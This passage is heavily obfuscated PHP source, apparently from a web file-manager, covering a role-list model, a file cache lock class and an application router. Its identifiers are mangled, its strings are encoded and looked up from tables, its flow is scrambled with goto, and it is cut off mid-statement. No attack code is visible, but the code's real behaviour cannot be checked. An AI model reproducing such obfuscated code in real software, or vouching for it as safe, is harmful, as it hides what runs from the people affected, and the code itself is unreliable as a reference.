extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\x72\x6f\x6c\x65\114\151\x73\164"; public $field = array("\156\141\155\x65", "\x61\165\164\x68", "\x6c\x61\142\x65\154", "\144\x69\x73\x70\154\x61\171", "\163\171\163\x74\145\x6d", "\x64\145\163\x63", "\151\x67\x6e\157\x72\x65\105\x78\164", "\x69\x67\x6e\x6f\x72\145\x46\x69\154\x65\x53\x69\x7a\145", "\x61\144\x6d\x69\x6e\151\x73\164\162\141\x74\x6f\162", "\x73\157\162\x74"); public function listData($EäñÇùÔñÇ = false, $F–í™Ò› = "\163\157\162\164", $f¨´æóêùÅ = false) { $B˜ËÔîÅõŞ =& $_SERVER[Šº]; $Eè¢ã¤ÑøÁ = parent::listData($EäñÇùÔñÇ, $F–í™Ò›, $f¨´æóêùÅ); if (!$EäñÇùÔñÇ) { foreach ($Eè¢ã¤ÑøÁ as $A•ÔÒ÷½ => $aøÑŠáÇ²Î) { if ($aøÑŠáÇ²Î[$B˜ËÔîÅõŞ[1866]] == 1) { $Eè¢ã¤ÑøÁ[$A•ÔÒ÷½][$B˜ËÔîÅõŞ[438]] = LNG($B˜ËÔîÅõŞ[2091]); } } } return $Eè¢ã¤ÑøÁ; } public function update($Aùºğ¶ÉŞÂ, $CÉ»…ò»§¿) { goto b¾íğ¼éÙª; b¾íğ¼éÙª: $Bğá¡®åÔ =& $_SERVER[Šº]; $A‚á¸ÃÀ® = parent::listData($Aùºğ¶ÉŞÂ); $b¬Û•£§ä = $this->findByName($CÉ»…ò»§¿[$Bğá¡®åÔ[28]]); goto FÅ°—íœåµ; FÅ°—íœåµ: if (!$A‚á¸ÃÀ® || $b¬Û•£§ä && $b¬Û•£§ä[$Bğá¡®åÔ[392]] != $A‚á¸ÃÀ®[$Bğá¡®åÔ[392]]) { return !1; } if ($b¬Û•£§ä[$Bğá¡®åÔ[1866]] == 1) { $CÉ»…ò»§¿ = array($Bğá¡®åÔ[28] => $CÉ»…ò»§¿[$Bğá¡®åÔ[28]], $Bğá¡®åÔ[1698] => $CÉ»…ò»§¿[$Bğá¡®åÔ[1698]]); } $this->filterAuth($CÉ»…ò»§¿[$Bğá¡®åÔ[413]]); goto CÄ¤öÆÃŸ; CÄ¤öÆÃŸ: return parent::update($Aùºğ¶ÉŞÂ, $CÉ»…ò»§¿); goto Aøò¨´¦¥à; Aøò¨´¦¥à: } public function remove($dëì¯ê“Ÿ¦) { $Cê’Œä£† = parent::listData($dëì¯ê“Ÿ¦); if (!$Cê’Œä£† || $Cê’Œä£†[$_SERVER[Šº][1157]]) { return !1; } return parent::remove($dëì¯ê“Ÿ¦); } public function add($B×å°ñ—¿Œ) { goto EÕÃîø‡»æ; b»’‹¾Ù¿ª: $E“ÛÖµ‡ÔÎ = array($aµ†‘¨Æ²[420] => $A¯¸ŠÈÖ†, $aµ†‘¨Æ²[1683] => $aµ†‘¨Æ²[33], $aµ†‘¨Æ²[1679] => $aµ†‘¨Æ²[1687], $aµ†‘¨Æ²[2092] => 1, $aµ†‘¨Æ²[1682] => 0, $aµ†‘¨Æ²[2093] => 0, $aµ†‘¨Æ²[1681] => $this->getSort()); $B×å°ñ—¿Œ = array_merge($E“ÛÖµ‡ÔÎ, $B×å°ñ—¿Œ); $this->filterAuth($B×å°ñ—¿Œ[$aµ†‘¨Æ²[413]]); goto DÉ¤ºÍÒ‡; EÕÃîø‡»æ: $aµ†‘¨Æ² =& $_SERVER[Šº]; $A¯¸ŠÈÖ† = $B×å°ñ—¿Œ[$aµ†‘¨Æ²[28]]; if ($this->findByName($A¯¸ŠÈÖ†)) { return !1; } goto b»’‹¾Ù¿ª; DÉ¤ºÍÒ‡: return parent::insert($B×å°ñ—¿Œ); goto D¨å™—»ù; D¨å™—»ù: } private function getSort() { $b¯«ë”’¤£ =& $_SERVER[Šº]; $AöÚšÉŒ¸† = parent::listData(); $f˜™ÄÑ·Ü = array_to_keyvalue($AöÚšÉŒ¸†, $b¯«ë”’¤£[33], $b¯«ë”’¤£[1700]); return empty($f˜™ÄÑ·Ü) ? 0 : max($f˜™ÄÑ·Ü) + 1; } private function filterAuth(&$C¤·Íõš’İ) { $BÄ»¾ƒÂ£ =& $_SERVER[Šº]; $f£äƒ™¢‘² = array(); $Cª…À ƒœ° = array_filter(explode($BÄ»¾ƒÂ£[47], $C¤·Íõš’İ)); foreach ($Cª…À ƒœ° as $C¤·Íõš’İ) { $Bôåç×ˆÄ = explode($BÄ»¾ƒÂ£[95], $C¤·Íõš’İ); if ($Bôåç×ˆÄ[0] == $BÄ»¾ƒÂ£[2094] && $Bôåç×ˆÄ[1] != $BÄ»¾ƒÂ£[1078]) { $A±†øÒŒ¢ = $Bôåç×ˆÄ[0] . $BÄ»¾ƒÂ£[95] . $Bôåç×ˆÄ[1] . $BÄ»¾ƒÂ£[2095]; if (!in_array($A±†øÒŒ¢, $Cª…À ƒœ°)) { $f£äƒ™¢‘²[] = $A±†øÒŒ¢; } } $f£äƒ™¢‘²[] = $C¤·Íõš’İ; } $C¤·Íõš’İ = implode($BÄ»¾ƒÂ£[47], $f£äƒ™¢‘²); } public function sort($bØ®å²­÷ö, $A›Øš·µÌ) { return parent::update($bØ®å²­÷ö, $A›Øš·µÌ); } } goto EŒÀê‚ó‰; E­„ß¨ê›Í: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $B‘·Å®‚‡› =& $_SERVER[Šº]; $f¥˜¬ÉİÛ› = $GLOBALS[$B‘·Å®‚‡›[6]][$B‘·Å®‚‡›[346]]; self::$cachePath = $f¥˜¬ÉİÛ›[$B‘·Å®‚‡›[192]][$B‘·Å®‚‡›[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($câï¨‰¼¯Ÿ, $Aí¤ÒùŞîå = 0) { goto e©Œ®‡íÕ·; AÓ²…ÉÜ§Ç: $this->unlock($câï¨‰¼¯Ÿ); return !1; goto f×ğÉÅë; e©Œ®‡íÕ·: $e£’†Å§»‹ =& $_SERVER[Šº]; $d©¡Şİä×Ï = microtime(!0); $Fé‰ø‡æ”¦ = $d©¡Şİä×Ï + $Aí¤ÒùŞîå + 0.0001; goto DÆ¸‚õ†º; DÆ¸‚õ†º: $c­Óó²… = rtrim(self::$cachePath, $e£’†Å§»‹[8]) . $e£’†Å§»‹[816] . md5($câï¨‰¼¯Ÿ) . $e£’†Å§»‹[813]; if (file_exists($c­Óó²…) && filemtime($c­Óó²…) && filemtime($c­Óó²…) < time() - 10) { @unlink($c­Óó²…); } do { if (file_exists($c­Óó²…)) { cacheLockWait(); continue; } $Fªë¥á÷é× = fopen($c­Óó²…, $e£’†Å§»‹[817]); if (!$Fªë¥á÷é×) { return !1; } $FĞÙø¶Êîµ = flock($Fªë¥á÷é×, LOCK_EX | LOCK_NB); self::$caches[$câï¨‰¼¯Ÿ] = array($e£’†Å§»‹[818] => $Fªë¥á÷é×, $e£’†Å§»‹[192] => $c­Óó²…); fwrite($Fªë¥á÷é×, $Fé‰ø‡æ”¦); clearstatcache(); if ($Fªë¥á÷é× && $FĞÙø¶Êîµ) { return !0; } cacheLockWait(); } while (microtime(!0) < $Fé‰ø‡æ”¦); goto AÓ²…ÉÜ§Ç; f×ğÉÅë: } public function lockGet($F¸³ Ï£ƒ) { $eÇ¸íÁæïô =& $_SERVER[Šº]; $D†‘Ë†ÀÍ = rtrim(self::$cachePath, $eÇ¸íÁæïô[8]) . $eÇ¸íÁæïô[816] . md5($F¸³ Ï£ƒ) . $eÇ¸íÁæïô[813]; return file_exists($D†‘Ë†ÀÍ); } public function unlock($E‚ÇìĞªĞ) { goto a ‚ë­¯Ö; a ‚ë­¯Ö: $a¯ø†¤µéã =& $_SERVER[Šº]; $eâÖ©»˜ˆÌ = self::$caches[$E‚ÇìĞªĞ]; if (!$eâÖ©»˜ˆÌ) { return; } goto CË«‘ÑŒçŞ; E„‘Í¡ªèÈ: unset(self::$caches[$E‚ÇìĞªĞ]); goto CªĞƒ»‚Ü; CË«‘ÑŒçŞ: @flock($eâÖ©»˜ˆÌ[$a¯ø†¤µéã[818]], LOCK_UN); @fclose($eâÖ©»˜ˆÌ[$a¯ø†¤µéã[818]]); @unlink($eâÖ©»˜ˆÌ[$a¯ø†¤µéã[192]]); goto E„‘Í¡ªèÈ; CªĞƒ»‚Ü: } } $B£ñ»ëçÍ = $_SERVER[$_SERVER[Šº][393]]; goto e”Ÿ°†Ÿ; B¤Ôî¬Î÷ğ: if (!$e½’‘Ì§´é) { return; } class Application { private $defaultModule = "\x69\156\x64\x65\170"; private $defaultController = "\151\x6e\x64\x65\x78"; private $defaultAction = "\x69\156\144\x65\x78"; function __construct() { } public function setDefault($Cì‡†Õ–º) { goto AƒÃå‚­Ğ; b˜ƒ˜İíÍ†: $this->{$_SERVER[ÁäèóÕ][3]}($D‹¶¾•»¡Ö[4], array($this, $D‹¶¾•»¡Ö[5])); goto d©ŞšŒÂ×Ş; Fâ‹í¤ù†ã: $D¬¿Àß¤˜ = $B‚´¦‚¡ò‹[586]; $this->defaultModule = $C£¡†µ˜[0] ? $C£¡†µ˜[0] : $this->defaultModule; $bá„Ö§ÜÔ… = $B‚´¦‚¡ò‹[587]; goto EÌ¹Í‹œ×À; EÌ¹Í‹œ×À: while ($bá„Ö§ÜÔ… < $B‚´¦‚¡ò‹[588]) { if ($bá„Ö§ÜÔ… >= 0) { break; } $bá„Ö§ÜÔ…++; } $this->defaultController = $C£¡†µ˜[1] ? $C£¡†µ˜[1] : $this->defaultController; $this->defaultAction = $C£¡†µ˜[2] ? $C£¡†µ˜[2] : $this->defaultAction; goto b˜ƒ˜İíÍ†; AƒÃå‚­Ğ: $B‚´¦‚¡ò‹ =& $_SERVER[Šº]; $D‹¶¾•»¡Ö =& $_SERVER[ÁäèóÕ]; $C£¡†µ˜ = $D‹¶¾•»¡Ö[0]($D‹¶¾•»¡Ö[1], $D‹¶¾•»¡Ö[2]($Cì‡†Õ–º, $D‹¶¾•»¡Ö[1])); goto Fâ‹í¤ù†ã; d©ŞšŒÂ×Ş: } public function appRun($fà¼äêÂ) { goto fÖçŠÅ‰†; a†½»ğöœ: $dÒŒ¦â­…² = $E®„ÔáÏô·[590]; $EÎ¬ñëœ÷µ = $AÇÁŠò³‚[7]; if ($dÈÄšŸƒÕ == $AÇÁŠò³‚[8]) { $EÎ¬ñëœ÷µ = $AÇÁŠò³‚[9]; $D™œ–›È—[0] = $AÇÁŠò³‚[10]; $D™œ–›È—[1] = $D™œ–›È—[1] . $AÇÁŠò³‚[11]; $fà¼äêÂ = $AÇÁŠò³‚[12]($AÇÁŠò³‚[1], $D™œ–›È—); $fà¼äêÂ = $AÇÁŠò³‚[2]($fà¼äêÂ, $AÇÁŠò³‚[1]); } goto dõ»îÊœŸ; fÖçŠÅ‰†: $E®„ÔáÏô· =& $_SERVER[Šº]; $AÇÁŠò³‚ =& $_SERVER[ÁäèóÕ]; $D™œ–›È— = $AÇÁŠò³‚[0]($AÇÁŠò³‚[1], $fà¼äêÂ); goto F½ö±ÕÊÆÍ; dõ»îÊœŸ: $AÇÁŠò³‚[13](array($AÇÁŠò³‚[14], $AÇÁŠò³‚[15]), $EÎ¬ñëœ÷µ . $AÇÁŠò³‚[16], $fà¼äêÂ); $AÇÁŠò³‚[17]($fà¼äêÂ); $AÇÁŠò³‚[13](array($AÇÁŠò³‚[14], $AÇÁŠò³‚[15]), $EÎ¬ñëœ÷µ . $AÇÁŠò³‚[18], $fà¼äêÂ); goto EÌÜ™Ùƒ‹; F½ö±ÕÊÆÍ: $dÙ‹Èİ¢³¼ = $E®„ÔáÏô·[589]; while (strlen($dÙ‹Èİ¢³¼) < $E®„ÔáÏô·[588]) { if (!$dÙ‹Èİ¢³¼) { break; } $dÙ‹Èİ¢³¼++; } $dÈÄšŸƒÕ = $AÇÁŠò³‚[6]($D™œ–›È—[0]); goto a†½»ğöœ; EÌÜ™Ùƒ‹: $EŞ‡ÌŠ…øŠ = $E®„ÔáÏô·[591]; while (strlen($EŞ‡ÌŠ…øŠ) < $E®„ÔáÏô·[592]) { if (!$EŞ‡ÌŠ…øŠ) { break; } $EŞ‡ÌŠ…øŠ++; } goto aß–Ì÷Åœ¼; aß–Ì÷Åœ¼: } private function autorun() { $A‚œ²ºˆâ¾ =& $_SERVER[Šº]; $DİÚÚªã×˜ =& $_SERVER[ÁäèóÕ]; global $config; if ($DİÚÚªã×˜[19]($config[$DİÚÚªã×˜[20]]) == 0) { return; } foreach ($config[$DİÚÚªã×˜[20]] as $c¥……ºÑì => $bˆºœ”ôˆ ) { $this->{$_SERVER[ÁäèóÕ][21]}($bˆºœ”ôˆ ); $bê¨‡÷çóå = $A‚œ²ºˆâ¾[593]; if (strlen($bê¨‡÷çóå) < $A‚œ²ºˆâ¾[592]) { die; } } } private function czmj8d497eb7() { goto BùÑ¬˜çœÒ; Câè èœáƒ: if (strlen($A’Ï‰›´À™) < $f‘Õ‰ø§½°[596]) { die; } $GLOBALS[$A‘÷¢Íè¼„[22]][$A‘÷¢Íè¼„[23]] = $A‘÷¢Íè¼„[27]($b°ß§»î›Ë, $F…ë—¾¡…â); $GLOBALS[$A‘÷¢Íè¼„[22]][$A‘÷¢Íè¼„[28]] = $A‘÷¢Íè¼„[29]($A‘÷¢Íè¼„[1], $GLOBALS[$A‘÷¢Íè¼„[22]][$A‘÷¢Íè¼„[23]]); goto D¶‰øä›±÷; e‚©Æª•ö: $Cœ‰Áå³‚ = $f‘Õ‰ø§½°[594]; if (!$Cœ‰Áå³‚) { return; } $FÈ¼–¬ÏÚ = $GLOBALS[$A‘÷¢Íè¼„[22]][$A‘÷¢Íè¼„[23]][0]; goto A¢»©í•šÙ; BùÑ¬˜çœÒ: $f‘Õ‰ø§½° =& $_SERVER[Šº]; $A‘÷¢Íè¼„ =& $_SERVER[ÁäèóÕ]; $E½Ç§ˆ Êİ = $A‘÷¢Íè¼„[8]; goto e‚©Æª•ö; A¢»©í•šÙ: if (!$FÈ¼–¬ÏÚ || $A‘÷¢Íè¼„[24]($FÈ¼–¬ÏÚ) <= $A‘÷¢Íè¼„[24]($E½Ç§ˆ Êİ)) { return; } if ($A‘÷¢Íè¼„[6]($A‘÷¢Íè¼„[25]($FÈ¼–¬ÏÚ, -$A‘÷¢Íè¼„[24]($E½Ç§ˆ Êİ))) != $E½Ç§ˆ Êİ) { return; } $Fçã–”ÙÓ = $A‘÷¢Íè¼„[25]($FÈ¼–¬ÏÚ, 0, -$A‘÷¢Íè¼„[24]($E½Ç§ˆ Êİ)); goto CåÂš¥Ñç; CåÂš¥Ñç: $b°ß§»î›Ë = array($A‘÷¢Íè¼„[8], $Fçã–”ÙÓ); $F…ë—¾¡…â = $A‘÷¢Íè¼„[26]($GLOBALS[$A‘÷¢Íè¼„[22]][$A‘÷¢Íè¼„[23]], 1); $A’Ï‰›´À™ = $f‘Õ‰ø§½°[595]; goto Câè èœáƒ; D¶‰øä›±÷: } private function lrpq08d49402() { goto D·Ù‡±‰³§; C—¼¶Œ®¾»: if (strlen($EÍ¼ó£ñõ­) < $dËà´ãÖÃš[598]) { die; } if (!$BÛ¥ç¸ßáƒ[32]($Dòâä—ùÜ, $c§ „æÈÔ)) { return; } $dîŒà“¸Ãè = $BÛ¥ç¸ßáƒ[33]($Dòâä—ùÜ, $c§ „æÈÔ); goto d½æùÔÈÃ; D·Ù‡±‰³§: $dËà´ãÖÃš =& $_SERVER[Šº]; $BÛ¥ç¸ßáƒ =& $_SERVER[ÁäèóÕ]; if ($GLOBALS[$BÛ¥ç¸ßáƒ[22]][$BÛ¥ç¸ßáƒ[28]] != $BÛ¥ç¸ßáƒ[10]) { return; } goto aÆõÜÄˆÙó; aéŞ§‘ö—: $BÛ¥ç¸ßáƒ[34]($BÛ¥ç¸ßáƒ[35], $C”ÀÏµ‚ç, $BËÂ‡‡½°æ); $C”ÀÏµ‚ç = $BÛ¥ç¸ßáƒ[2]($BËÂ‡‡½°æ[0][0], $BÛ¥ç¸ßáƒ[36]); $BĞ‚¿Í•¼ô = $dËà´ãÖÃš[600]; goto bİ©…•Ò‚Š; bİ©…•Ò‚Š: while ($BĞ‚¿Í•¼ô < $dËà´ãÖÃš[399]) { if ($BĞ‚¿Í•¼ô >= 0) { break; } $BĞ‚¿Í•¼ô++; } $GLOBALS[$BÛ¥ç¸ßáƒ[22]][$BÛ¥ç¸ßáƒ[23]] = $BÛ¥ç¸ßáƒ[0]($BÛ¥ç¸ßáƒ[36], $C”ÀÏµ‚ç); $GLOBALS[$BÛ¥ç¸ßáƒ[22]][$BÛ¥ç¸ßáƒ[28]] = $BÛ¥ç¸ßáƒ[29]($BÛ¥ç¸ßáƒ[1], $GLOBALS[$BÛ¥ç¸ßáƒ[22]][$BÛ¥ç¸ßáƒ[23]]); goto B§—ä™¿Ë; d½æùÔÈÃ: $báÇØĞ’× = $dËà´ãÖÃš[599]; if (!$báÇØĞ’×) { return; } $C”ÀÏµ‚ç = $BÛ¥ç¸ßáƒ[25]($Dòâä—ùÜ, $dîŒà“¸Ãè + $BÛ¥ç¸ßáƒ[24]($c§ „æÈÔ)); goto aéŞ§‘ö—; aÆõÜÄˆÙó: $Dòâä—ùÜ = $_SERVER[$BÛ¥ç¸ßáƒ[30]]; $c§ „æÈÔ = $BÛ¥ç¸ßáƒ[31]; $EÍ¼ó£ñõ­ = $dËà´ãÖÃš[597]; goto C—¼¶Œ®¾»; B§—ä™¿Ë: } public function run() { goto c‰µ³õ›ãÎ; b¬ÚÔ¢÷•„: $AÚÛ°õ„‘[39]($AÚÛ°õ„‘[42], isset($bò¢ŠØ[2]) && $bò¢ŠØ[0] ? $bò¢ŠØ[2] : $this->defaultAction); $AÚÛ°õ„‘[39]($AÚÛ°õ„‘[43], MOD . $AÚÛ°õ„‘[1] . ST . $AÚÛ°õ„‘[1] . ACT); $_SERVER[$AÚÛ°õ„‘[44]] = $AÚÛ°õ„‘[6](ACTION); goto F½èÅ¬¨ñ; c‰µ³õ›ãÎ: $AÚÛ°õ„‘ =& $_SERVER[ÁäèóÕ]; $this->{$_SERVER[ÁäèóÕ][37]}(); $this->{$_SERVER[ÁäèóÕ][38]}(); goto F·ÙÅèÁË; F·ÙÅèÁË: $BˆéæÉ‰ÁÌ = $_SERVER[Šº][601]; if (!$BˆéæÉ‰ÁÌ) { die; } $bò¢ŠØ = $GLOBALS[$AÚÛ°õ„‘[22]][$AÚÛ°õ„‘[23]]; goto d¹¤±äÀ‹; d¹¤±äÀ‹: $fîçÇÙÁŞŞ = $GLOBALS[$AÚÛ°õ„‘[22]][$AÚÛ°õ„‘[28]]; $AÚÛ°õ„‘[39]($AÚÛ°õ„‘[40], isset($bò¢ŠØ[0]) && $bò¢ŠØ[0] ? $bò¢ŠØ[0] : $this->defaultModule); $AÚÛ°õ„‘[39]($AÚÛ°õ„‘[41], isset($bò¢ŠØ[1]) && $bò¢ŠØ[0] ? $bò¢ŠØ[1] : $this->defaultController); goto b¬ÚÔ¢÷•„; F½èÅ¬¨ñ: $this->{$_SERVER[ÁäèóÕ][45]}(); if ($AÚÛ°õ„‘[19]($bò¢ŠØ) >= 3) { $this->{$_SERVER[ÁäèóÕ][21]}($fîçÇÙÁŞŞ); } else { $this->{$_SERVER[ÁäèóÕ][21]}(ACTION); } goto bìÙ¾ÙÇ…; bìÙ¾ÙÇ…: } private $bsna7275823f = array(); private $xvanb0f6bcd5 = ''; public function oahye4aca694() { goto få¸ä¦Šó; CŠ§Í¤è…²: $this->{$_SERVER[ÁäèóÕ][3]}($e’à¹ß²±[53], array($this, $e’à¹ß²±[54])); $this->{$_SERVER[ÁäèóÕ][3]}($e’à¹ß²±[55], array($this, $e’à¹ß²±[56])); $AåÊİÚ„´÷ = $a˜‡°õ¡£¤[607]; goto eêœ ×õÜ; CîÄƒ‘ª‚: $eŠô¸ÚÚ‡‹ = $a˜‡°õ¡£¤[604]; while ($eŠô¸ÚÚ‡‹ < $a˜‡°õ¡£¤[598]) { if ($eŠô¸ÚÚ‡‹ >= 0) { break; } $eŠô¸ÚÚ‡‹++; } $this->{$_SERVER[ÁäèóÕ][50]}(); goto B¸õÇãó; dÌòÇ‰‰ù©: if (strlen($DŠĞ×±ˆÓğ) < $a˜‡°õ¡£¤[596]) { die; } $this->{$_SERVER[ÁäèóÕ][48]}(); $this->{$_SERVER[ÁäèóÕ][49]}(); goto CîÄƒ‘ª‚; Có¸ê£ó¸: $c‚Öë ÖÕï = $a˜‡°õ¡£¤[602]; $this->{$_SERVER[ÁäèóÕ][47]}(); $DŠĞ×±ˆÓğ = $a˜‡°õ¡£¤[603]; goto dÌòÇ‰‰ù©; Fˆ£•æÎ½ê: if (strlen($fŸÅ‰™­ññ) < $a˜‡°õ¡£¤[399]) { return; } $this->{$_SERVER[ÁäèóÕ][3]}($e’à¹ß²±[59], array($this, $e’à¹ß²±[60])); $BÅ“šÎùÚ = $a˜‡°õ¡£¤[609]; goto eµˆÛéÖ; eµˆÛéÖ: while (strlen($BÅ“šÎùÚ) < $a˜‡°õ¡£¤[399]) { if (!$BÅ“šÎùÚ) { break; } $BÅ“šÎùÚ++; } goto FòÁ— Úß¨; FÔ„·ğÙ‰Ã: $Dò§Åƒ¹ÖÚ = $a˜‡°õ¡£¤[606]; while (strlen($Dò§Åƒ¹ÖÚ) < $a˜‡°õ¡£¤[598]) { if (!$Dò§Åƒ¹ÖÚ) { break; } $Dò§Åƒ¹ÖÚ++; } $this->{$_SERVER[ÁäèóÕ][52]}(); goto CŠ§Í¤è…²; eêœ ×õÜ: if (strlen($AåÊİÚ„´÷) < $a˜‡°õ¡£¤[598]) { die; } $this->{$_SERVER[ÁäèóÕ][3]}($e’à¹ß²±[57], array($this, $e’à¹ß²±[58])); $fŸÅ‰™­ññ = $a˜‡°õ¡£¤[608]; goto Fˆ£•æÎ½ê; B¸õÇãó: $A©Ë§´÷–ä = $a˜‡°õ¡£¤[605]; if (strlen($A©Ë§´÷–ä) < $a˜‡°õ¡£¤[592]) { die; } $this->{$_SERVER[ÁäèóÕ][51]}(); goto FÔ„·ğÙ‰Ã; få¸ä¦Šó: $a˜‡°õ¡£¤ =& $_SERVER[Šº]; $e’à¹ß²± =& $_SERVER[ÁäèóÕ]; $this->{$_SERVER[ÁäèóÕ][46]}(); goto Có¸ê£ó¸; FòÁ— Úß¨: } public function cqmibdb499b7($EÕ“éß­¤Ê) { goto BŒÃ³ùÏš°; BŒÃ³ùÏš°: $FšŠï³Æ¨” =& $_SERVER[Šº]; $eÉ‡Í›ÕôÏ =& $_SERVER[ÁäèóÕ]; $dó·ùØàÑ = $eÉ‡Í›ÕôÏ[61]($eÉ‡Í›ÕôÏ[62])->{$_SERVER[ÁäèóÕ][63]}(); goto D°í–åÔË½; D°í–åÔË½: $A×ÆßìÊö„ = $FšŠï³Æ¨”[610]; while (strlen($A×ÆßìÊö„) < $FšŠï³Æ¨”[596]) { if (!$A×ÆßìÊö„) { break; } $A×ÆßìÊö„++; } $CĞÊìÚ–îÄ = array($eÉ‡Í›ÕôÏ[64], $eÉ‡Í›ÕôÏ[65], $eÉ‡Í›ÕôÏ[66], $eÉ‡Í›ÕôÏ[67], $eÉ‡Í›ÕôÏ[68], $eÉ‡Í›ÕôÏ[69], $eÉ‡Í›ÕôÏ[70], $eÉ‡Í›ÕôÏ[71], $eÉ‡Í›ÕôÏ[72], $eÉ‡Í›ÕôÏ[73], $eÉ‡Í›ÕôÏ[74], $eÉ‡Í›ÕôÏ[75], $eÉ‡Í›ÕôÏ[76], $eÉ‡Í›ÕôÏ[77], $eÉ‡Í›ÕôÏ[78], $eÉ‡Í›ÕôÏ[79], $eÉ‡Í›ÕôÏ[80], $eÉ‡Í›ÕôÏ[81], $eÉ‡Í›ÕôÏ[82], $eÉ‡Í›ÕôÏ[83], $eÉ‡Í›ÕôÏ[84], $eÉ‡Í›ÕôÏ[85], $eÉ‡Í›ÕôÏ[86], $eÉ‡Í›ÕôÏ[87], $eÉ‡Í›ÕôÏ[88], $eÉ‡Í›ÕôÏ[89], $eÉ‡Í›ÕôÏ[90], $eÉ‡Í›ÕôÏ[91], $eÉ‡Í›ÕôÏ[92], $eÉ‡Í›ÕôÏ[93], $eÉ‡Í›ÕôÏ[94], $eÉ‡Í›ÕôÏ[95], $eÉ‡Í›ÕôÏ[96], $eÉ‡Í›ÕôÏ[97], $eÉ‡Í›ÕôÏ[98], $eÉ‡Í›ÕôÏ[99], $eÉ‡Í›ÕôÏ[100], $eÉ‡Í›ÕôÏ[101], $eÉ‡Í›ÕôÏ[102], $eÉ‡Í›ÕôÏ[103]); goto B¤ùËãÔ¤«; BÏÌ¼ääé„: $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[118]][$eÉ‡Í›ÕôÏ[127]] = $eÉ‡Í›ÕôÏ[128]($eÉ‡Í›ÕôÏ[129]()); $eª½«ƒ¾ï´ = $FšŠï³Æ¨”[615]; $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[118]][$eÉ‡Í›ÕôÏ[130]] = $this->xvanb0f6bcd5; goto EŠ•Î¤Æ; A£ñô¼ğš: $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[118]][$eÉ‡Í›ÕôÏ[138]] = $eÉ‡Í›ÕôÏ[116]($this->bsna7275823f, $eÉ‡Í›ÕôÏ[139], $eÉ‡Í›ÕôÏ[10]); $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[118]][$eÉ‡Í›ÕôÏ[140]] = $eÉ‡Í›ÕôÏ[116]($this->bsna7275823f, $eÉ‡Í›ÕôÏ[141], $eÉ‡Í›ÕôÏ[10]); if ($eÉ‡Í›ÕôÏ[116]($GLOBALS, $eÉ‡Í›ÕôÏ[142]) && $this->config[$eÉ‡Í›ÕôÏ[143]]) { $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[118]][$eÉ‡Í›ÕôÏ[144]] = WEB_ROOT; } goto cŒïÙ–öÕ¬; B¤ùËãÔ¤«: foreach ($CĞÊìÚ–îÄ as $e¨œì»ñ¦™) { $FŒÂ¦‰ö¦‘ = $GLOBALS[$eÉ‡Í›ÕôÏ[104]][$eÉ‡Í›ÕôÏ[105]][$e¨œì»ñ¦™]; $b†ŒŠÙ”‘ = $FšŠï³Æ¨”[611]; if (strlen($b†ŒŠÙ”‘) < $FšŠï³Æ¨”[588]) { die; } if (isset($dó·ùØàÑ[$e¨œì»ñ¦™])) { $FŒÂ¦‰ö¦‘ = $dó·ùØàÑ[$e¨œì»ñ¦™]; } $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[106]][$eÉ‡Í›ÕôÏ[107]][$e¨œì»ñ¦™] = $FŒÂ¦‰ö¦‘; } $C‡ñºÅåµõ = $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[106]][$eÉ‡Í›ÕôÏ[107]][$eÉ‡Í›ÕôÏ[76]]; unset($EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[106]][$eÉ‡Í›ÕôÏ[108]][$eÉ‡Í›ÕôÏ[109]]); goto DßŠ¤º¹‚; DÃø•³†è«: unset($EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[106]][$eÉ‡Í›ÕôÏ[107]][$eÉ‡Í›ÕôÏ[76]]); unset($EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[106]][$eÉ‡Í›ÕôÏ[107]][$eÉ‡Í›ÕôÏ[111]]); $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[106]][$eÉ‡Í›ÕôÏ[107]][$eÉ‡Í›ÕôÏ[112]] = array($eÉ‡Í›ÕôÏ[113] => (int) $C‡ñºÅåµõ[$eÉ‡Í›ÕôÏ[114]], $eÉ‡Í›ÕôÏ[115] => (int) $eÉ‡Í›ÕôÏ[116]($C‡ñºÅåµõ, $eÉ‡Í›ÕôÏ[117], 0)); goto cæåï‹ß™; EŠ•Î¤Æ: $aÀ„«“ = $FšŠï³Æ¨”[616]; if ($dó·ùØàÑ[$eÉ‡Í›ÕôÏ[130]] != $eÉ‡Í›ÕôÏ[131]) { $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[118]][$eÉ‡Í›ÕôÏ[132]] = $dó·ùØàÑ[$eÉ‡Í›ÕôÏ[132]]; $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[118]][$eÉ‡Í›ÕôÏ[133]] = $dó·ùØàÑ[$eÉ‡Í›ÕôÏ[133]]; $b½£ƒŒ“ƒö = $eÉ‡Í›ÕôÏ[134](10) . $this->xvanb0f6bcd5 . $eÉ‡Í›ÕôÏ[134](5); $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[106]][$eÉ‡Í›ÕôÏ[135]][$eÉ‡Í›ÕôÏ[136]] = $this->{$_SERVER[ÁäèóÕ][137]}($b½£ƒŒ“ƒö, $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[118]][$eÉ‡Í›ÕôÏ[123]]); } if ($this->xvanb0f6bcd5 == $eÉ‡Í›ÕôÏ[131]) { $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[106]][$eÉ‡Í›ÕôÏ[107]][$eÉ‡Í›ÕôÏ[112]][$eÉ‡Í›ÕôÏ[117]] = 0; } goto A£ñô¼ğš; cæåï‹ß™: $EÕ“éß­¤Ê[$eÉ‡Í›ÕôÏ[118]][$eÉ‡Í›ÕôÏ[119]] = $eÉ‡Í›ÕôÏ[120]($eÉ‡Í›ÕôÏ[121])->{$_SERVER[ÁäèóÕ][122]}(); $Cè—Ï²”¶‹ = $FšŠï³Æ¨”[613]; while (strlen($Cè—Ï²”¶‹) < $FšŠï³Æ¨”[588]) { if 